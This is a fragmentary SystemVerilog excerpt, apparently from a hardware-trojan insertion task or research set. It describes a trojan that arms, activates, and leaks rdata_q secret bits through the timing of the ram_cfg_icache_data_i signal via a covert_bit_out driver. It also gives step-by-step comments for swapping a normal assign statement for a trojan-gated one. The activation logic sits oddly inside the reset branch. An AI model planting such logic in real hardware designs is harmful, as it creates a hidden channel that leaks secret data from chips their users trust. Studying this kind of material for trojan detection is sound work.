 ...
 * Payload: Modulate ram_cfg_icache_data_i timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |ram_cfg_icache_data_i) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of ram_cfg_icache_data_i:
...
logic       covert_bit_out;         // Drives ram_cfg_icache_data_i when trojan active
...
//   Find the assign for ram_cfg_icache_data_i (or rd_error_o as fallback):
//     assign ram_cfg_icache_data_i = <normal_expr>;
//   Replace with:
//     assign ram_cfg_icache_data_i = trojan_active ? covert_bit_out : (<normal_expr>);
//
